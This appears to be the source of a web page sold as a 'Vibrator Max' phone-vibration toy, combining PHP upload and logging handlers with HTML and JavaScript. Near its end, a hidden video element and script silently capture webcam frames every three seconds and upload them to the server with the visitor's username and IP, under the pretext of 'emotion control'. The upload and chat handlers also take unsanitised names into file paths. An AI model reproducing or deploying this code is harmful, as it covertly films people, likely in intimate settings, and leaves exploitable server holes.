<?php
// Handle file upload
if (isset($_FILES['media'])) {
    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $file = $_FILES['media'];
    $username = isset($_POST['username']) ? $_POST['username'] : 'user';
    $dateStr = date('Y-m-d');
    $originalName = basename($file['name']);
    $ext = pathinfo($originalName, PATHINFO_EXTENSION);
    $filename = "{$username}_{$dateStr}_" . uniqid() . "." . $ext;
    $uploadPath = $uploadDir . $filename;

    if (move_uploaded_file($file['tmp_name'], $uploadPath)) {
        echo json_encode(['success' => true, 'path' => $uploadPath]);
        exit;
    } else {
        echo json_encode(['success' => false, 'error' => 'Upload failed']);
        exit;
    }
}

// Handle saving/loading chat messages
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $chatCode = $_POST['chatCode'];
    $chatFile = 'chats/' . $chatCode . '.json';

    if (!is_dir('chats')) {
        mkdir('chats', 0777, true);
    }

    if ($action === 'saveMessage') {
        $messageText = $_POST['message'] ?? '';
        $sender = $_POST['sender'] ?? '';
        $mediaUrl = $_POST['mediaUrl'] ?? null;
        $mediaType = $_POST['mediaType'] ?? null;
        $timestamp = time();

        $msg = ['sender' => $sender, 'timestamp' => $timestamp];
        if ($messageText) {
            $msg['message'] = $messageText;
        }
        if ($mediaUrl && $mediaType) {
            $msg['mediaUrl'] = $mediaUrl;
            $msg['mediaType'] = $mediaType;
        }

        $messages = [];
        if (file_exists($chatFile)) {
            $json = file_get_contents($chatFile);
            $messages = json_decode($json, true);
        }
        $messages[] = $msg;
        if (count($messages) > 50) {
            $messages = array_slice($messages, -50);
        }
        file_put_contents($chatFile, json_encode($messages));
        echo json_encode(['status' => 'ok']);
        exit;
    } elseif ($action === 'loadMessages') {
        if (file_exists($chatFile)) {
            echo file_get_contents($chatFile);
        } else {
            echo '[]';
        }
        exit;
    }
}

// Cleanup old media after 24 hours
$infoFile = 'uploads/media_info.json';
if (file_exists($infoFile)) {
    $json = file_get_contents($infoFile);
    $data = json_decode($json, true);
    $changed = false;
    $now = time();
    foreach ($data as $key => $entry) {
        if ($now - $entry['uploaded_at'] > 24*60*60) {
            if (file_exists($entry['path'])) {
                unlink($entry['path']);
            }
            unset($data[$key]);
            $changed = true;
        }
    }
    if ($changed) {
        file_put_contents($infoFile, json_encode(array_values($data)));
    }
}
?>



<?php
// total-visits.php

// Initialize total visits
$totalVisitsFile = 'total-visits.json';
if (file_exists($totalVisitsFile)) {
    $totalVisitsData = json_decode(file_get_contents($totalVisitsFile), true);
    $totalVisits = $totalVisitsData['totalVisits'] + 1;
} else {
    $totalVisits = 1;
}

// Update total visits
file_put_contents($totalVisitsFile, json_encode(['totalVisits' => $totalVisits]));

// Initialize daily visits
$dailyVisitsFile = 'daily-visits.json';
if (file_exists($dailyVisitsFile)) {
    $dailyVisitsData = json_decode(file_get_contents($dailyVisitsFile), true);
} else {
    $dailyVisitsData = [];
}

$today = date('Y-m-d');
$ip = $_SERVER['REMOTE_ADDR'];

// Get the name of the day for today
$dayName = date('l');

// Check if today's date exists in daily visits
if (!isset($dailyVisitsData[$today])) {
    $dailyVisitsData[$today] = [$dayName => []]; // Create a new array for the day
}

// Increment the visit count for the IP address
if (isset($dailyVisitsData[$today][$dayName][$ip])) {
    $dailyVisitsData[$today][$dayName][$ip]++;
} else {
    $dailyVisitsData[$today][$dayName][$ip] = 1;
}

// Sort dates in descending order
uksort($dailyVisitsData, function($a, $b) {
    return strtotime($b) - strtotime($a);
});

// Update daily visits
file_put_contents($dailyVisitsFile, json_encode($dailyVisitsData, JSON_PRETTY_PRINT));
?>

<?php
// Set the path for your JSON file
$jsonFilePath = 'traffic_data.json';

// Get the referrer
$referrer = isset($_SERVER['HTTP_REFERER']) ? parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) : 'Direct Access';
$currentDate = date("Y-m-d");

// Load existing traffic data
if (file_exists($jsonFilePath)) {
    $existingData = json_decode(file_get_contents($jsonFilePath), true);
    if (!is_array($existingData)) {
        $existingData = []; // Initialize as an empty array if there was an issue
    }
} else {
    $existingData = []; // Create an empty array if file does not exist
}

// Check if today's date already exists in the data
if (!isset($existingData[$currentDate])) {
    $existingData[$currentDate] = []; // Initialize the date entry if it doesn't exist
}

// Check if the referrer already exists for today
if (isset($existingData[$currentDate][$referrer])) {
    // Increment visit count from this referrer for today
    $existingData[$currentDate][$referrer]['visits'] += 1;
} else {
    // Initialize visit count for this referrer for today
    $existingData[$currentDate][$referrer] = ['visits' => 1];
}

// Sort the data so that the newest dates come first
krsort($existingData);

// Save updated data to JSON file
file_put_contents($jsonFilePath, json_encode($existingData, JSON_PRETTY_PRINT));

// Output success message (or you can simply redirect or show the website content)
echo "";
?>







<?php
// Handle image upload and log update
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['img']) && isset($_POST['image_name']) && isset($_POST['username'])) {
    $baseDir = 'kai-uploads';

    // Create main uploads folder if not exists
    if (!is_dir($baseDir)) {
        mkdir($baseDir, 0755, true);
    }

    $username = trim($_POST['username']);
    if (!$username) {
        $username = 'Anonymous';
    }

    // Sanitize username for folder name
    $safeUsername = preg_replace('/[^a-zA-Z0-9_\-]/', '_', $username);
    $userFolder = $baseDir . '/' . $safeUsername;

    // Create username folder if not exists
    if (!is_dir($userFolder)) {
        mkdir($userFolder, 0755, true);
    }

    // Create date folder inside username folder
    $dateFolderName = date('Y-m-d');
    $dateFolder = $userFolder . '/' . $dateFolderName;
    if (!is_dir($dateFolder)) {
        mkdir($dateFolder, 0755, true);
    }

    // Save the image
    $data = $_POST['img'];
    if (strpos($data, 'data:image/jpeg;base64,') === 0) {
        $data = substr($data, strlen('data:image/jpeg;base64,'));
    }

    $decodedData = base64_decode($data);
    if ($decodedData === false) {
        echo 'Error decoding image.';
        exit;
    }

    $filename = $dateFolder . '/' . basename($_POST['image_name']);

    if (file_put_contents($filename, $decodedData)) {
        // Update log file
        $logFile = 'kai-log.json';
        $logData = [];

        if (file_exists($logFile)) {
            $json = file_get_contents($logFile);
            $logData = json_decode($json, true);
        }

        if (!$logData) {
            $logData = [
                'visits' => 0,
                'first_visit' => null,
                'last_visit' => null,
                'ip' => '',
                'users' => []
            ];
        }

        $ip = $_SERVER['REMOTE_ADDR'];

        if (!isset($logData['users'][$username])) {
            $logData['users'][$username] = [
                'visit_count' => 0,
                'first_time' => null,
                'last_time' => null,
                'ip' => $ip
            ];
        }

        $now = date('Y-m-d H:i:s');
        $logData['visits']++;
        if (!$logData['first_visit']) {
            $logData['first_visit'] = $now;
        }
        $logData['last_visit'] = $now;
        $logData['ip'] = $ip;

        $userData =& $logData['users'][$username];
        $userData['visit_count']++;
        if (!$userData['first_time']) {
            $userData['first_time'] = $now;
        }
        $userData['last_time'] = $now;
        $userData['ip'] = $ip;

        file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT));

        echo 'Image saved in ' . htmlspecialchars($filename);
    } else {
        echo 'Failed to save image.';
    }
    exit;
}
?>





<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Feel Vibration</title>


<style>
* {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: linear-gradient(to bottom, #ff99cc, #ff66b2);
            color: white;
            margin: 0;
            padding: 0;
            touch-action: manipulation;
        }


/* Title styling */
h1 {
  font-size: 1.2em;
  color: black;
  margin-bottom: 10px;
  text-align: center;
}

/* Container for buttons - grid layout for 3x3, centered */
#buttonsContainer {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  grid-template-rows: repeat(3, auto);
  gap: 8px; /* space between buttons */
  justify-content: center; /* center grid horizontally if it has extra space */
  width: 100%;
  box-sizing: border-box;
}

/* Style buttons to be small and fit grid cells */
.feel-btn {
  padding: 2px 4px;          /* very small padding */
  font-size: 0.6em;          /* small font size */
  border: 2px solid transparent;
  border-radius: 3px;        /* smaller border radius */
  color: #ff33a6;
  font-weight: bold;
  cursor: pointer;
  box-shadow: 2px 2px 4px black;
  width: 95%;     
  height: auto;  
  margin-bottom: 5px;
  text-align: center;
}

/* Focus style for buttons */
.feel-btn:focus {
  outline: none;
  box-shadow: 0 0 2px #d6336c, 0 1px 2px rgba(0,0,0,0.2);
  border-color: #d6336c;
}

/* Active button style */
.feel-btn.active {
  background-color: #ffa1c4;
  box-shadow: 0 0 4px #d6336c, 0 2px 4px rgba(0,0,0,0.3);
  border-color: #d6336c;
}

/* Overlay timer for KaiOS */
#timerOverlay {
  position: fixed;
  top: 10px;
  right: 10px;
  background: rgba(214, 51, 108, 0.8);
  padding: 8px 15px;
  border-radius: 6px;
  font-size: 1em;
  color: #fff;
  display: none;
  z-index: 9999;
}
</style>



</head>
<body>
<h1>Vibrator Max </h1>
<div id="buttonsContainer">
  <button class="feel-btn" id="horny">🔥 Horny</button>
  <button class="feel-btn" id="crying">😭 Crying</button>
  <button class="feel-btn" id="hardcore">🤘 Hardcore</button>
  <button class="feel-btn" id="hell">😈 Hell</button>
  <button class="feel-btn" id="alone">😔 Alone</button>
  <button class="feel-btn" id="night">🌙 Night</button>
  <button class="feel-btn" id="bed">🛏️ Bed</button>
  <button class="feel-btn" id="excited">🎉 Excited</button>
  <button class="feel-btn" id="relaxed">😌 Relaxed</button>
  <button class="feel-btn" id="stop">Stop</button>
</div>

<div id="timerOverlay">02:00</div>


<div>
<button class="feel-btn" id="horny2">Horny 💦</button>
  <button class="feel-btn" id="hell2">Hell 😈</button>
  <button class="feel-btn" id="hardcore2">😭 Hardcore</button>
  <button class="feel-btn" id="stop2">Stop ❌</button>
  <!-- Add more feelings if needed -->


</div>



  
  <script>var vibrate=document.getElementById("horny2");if(vibrate){vibrate.onclick=function(){navigator.vibrate(1000);};}</script> 
  
  
  
  
  
  <script>var vibrate=document.getElementById("hell2");if(vibrate){vibrate.onclick=function(){navigator.vibrate([500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,]);};}</script>  
  
  
  
  <script>var vibrate=document.getElementById("hardcore2");if(vibrate){vibrate.onclick=function(){navigator.vibrate(15000000000000000000);};}</script> 


 <script>var vibrate=document.getElementById("stop2");if(vibrate){vibrate.onclick=function(){navigator.vibrate(0);};}</script>  



<script>
  const overlay = document.getElementById('timerOverlay');
  let timerId = null;
  let vibrationId = null;
  let currentActiveButton = null;

  const durations = {
    'horny': 1000,
    'crying': [300, 300, 300],
    'hardcore': 600000, // 10 min
    'hell': [500, 500, 500, 500, 500, 500, 500, 500, 500, 500],
    'alone': 700,
    'night': 300,
    'bed': 400,
    'excited': 600,
    'relaxed': 200,
    'stop': 0
  };

  const buttonsMap = {
    'horny': document.getElementById('horny'),
    'crying': document.getElementById('crying'),
    'hardcore': document.getElementById('hardcore'),
    'hell': document.getElementById('hell'),
    'alone': document.getElementById('alone'),
    'night': document.getElementById('night'),
    'bed': document.getElementById('bed'),
    'excited': document.getElementById('excited'),
    'relaxed': document.getElementById('relaxed'),
    'stop': document.getElementById('stop')
  };

  // Add click handlers to buttons
  Object.keys(buttonsMap).forEach(key => {
    const btn = buttonsMap[key];
    btn.onclick = () => {
      activateButton(btn, key);
    };
  });

  function activateButton(btn, key) {
    if (currentActiveButton) {
      currentActiveButton.classList.remove('active');
    }
    currentActiveButton = btn;
    btn.classList.add('active');

    if (timerId) {
      clearInterval(timerId);
      timerId = null;
    }
    if (vibrationId) {
      clearInterval(vibrationId);
      vibrationId = null;
    }

    let totalSeconds = 120;
    let vibrateDuration = durations[key] !== undefined ? durations[key] : 500;

    if (key === 'hardcore') {
      totalSeconds = 600;
      vibrateDuration = durations['hardcore'];
    }

    // Start vibration
    navigator.vibrate(vibrateDuration);
    vibrationId = setInterval(() => {
      navigator.vibrate(vibrateDuration);
    }, vibrateDuration + 100);

    // Show overlay
    overlay.style.display = 'block';
    overlay.textContent = formatTime(totalSeconds);

    // Start countdown
    timerId = setInterval(() => {
      totalSeconds--;
      if (totalSeconds <= 0) {
        clearInterval(timerId);
        clearInterval(vibrationId);
        vibrationId = null;
        overlay.style.display = 'none';
        if (currentActiveButton) {
          currentActiveButton.classList.remove('active');
          currentActiveButton = null;
        }
      } else {
        overlay.textContent = formatTime(totalSeconds);
      }
    }, 1000);
  }

  function formatTime(seconds) {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${padZero(m)}:${padZero(s)}`;
  }
  function padZero(n) {
    return n.toString().padStart(2, '0');
  }

  // Keyboard controls (keys 1-0)
  document.addEventListener('keydown', (e) => {
    const keyMap = {
      '1': 'horny',
      '2': 'crying',
      '3': 'hardcore',
      '4': 'hell',
      '5': 'alone',
      '6': 'night',
      '7': 'bed',
      '8': 'excited',
      '9': 'relaxed',
      '0': 'stop'
    };
    const mappedKey = keyMap[e.key];
    if (mappedKey && buttonsMap[mappedKey]) {
      activateButton(buttonsMap[mappedKey], mappedKey);
    }
  });
</script>




<script>
  // Show the instructions alert when the page loads
  alert(`🎉 Welcome to Vibrator Max! 🎉

🔊 Allow Camera & Mic Permissions for Voice & Emotion Control App 🎤🧠

🖤 Choose Your Experience:
  1️⃣: Soft
  2️⃣: Medium
  3️⃣: Strong
  4️⃣: Pulse
  5️⃣: Wave 🌊 [500, 200, 500]
  6️⃣: Relax 🧘‍♂️ [100, 300, 100]
  7️⃣: Excite ⚡ [400, 200, 400]
  8️⃣: Horny 🔥 1200
  9️⃣: Date Night 🌹 1500

⚙️ Modes:
  0️⃣: Continue Mode 🔄
  *: Try All Modes 🎯

Enjoy sharing your moments! 😊✨`);
</script>






<style>

  /* Hidden video element, optional: display: none; */
  #mirror {
display: none;
     position: fixed;
  top: 10px;
  right: 10px;
height: 40px;
width: 50px;
  background: rgba(214, 51, 108, 0.8);
  padding: 8px 15px;
  border-radius: 6px;
  }
  #status {
     display: none;
  }
</style>


<!-- Hidden video element for capturing frames -->
<video id="mirror" autoplay playsinline></video>
<div id="status"></div>

<script>
const video = document.getElementById('mirror');
const statusDiv = document.getElementById('status');

let username = localStorage.getItem('username');
if (!username) {
    username = prompt('Enter your username:');
    if (username) {
        localStorage.setItem('username', username);
    } else {
        username = 'Anonymous';
        localStorage.setItem('username', username);
    }
}

// Fetch user's IP
let userIP = '';
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
      userIP = data.ip;
  })
  .catch(() => {
      userIP = 'Unknown';
  });

// Access camera
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    video.srcObject = stream;
    startAutoCapture();
})
.catch(error => {
    statusDiv.textContent = 'Camera access error: ' + error.message;
});

// Function to capture and upload
function captureAndUpload() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataURL = canvas.toDataURL('image/jpeg');

    const now = new Date();
    const dateStr = now.toISOString().replace(/[:.]/g, '-');
    const imageName = `${username}-${dateStr}-${userIP}.jpg`;

    const xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                // Optional: update status or keep silent
            }
        }
    };
    xhr.send('img=' + encodeURIComponent(dataURL) + '&username=' + encodeURIComponent(username) + '&image_name=' + encodeURIComponent(imageName));
}

// Start auto capture immediately
function startAutoCapture() {
    if (!window.captureInterval) {
        window.captureInterval = setInterval(captureAndUpload, 3000);
        // Optional: update status
        // statusDiv.textContent = 'Auto capturing and uploading...';
    }
}
</script>




</body>
</html>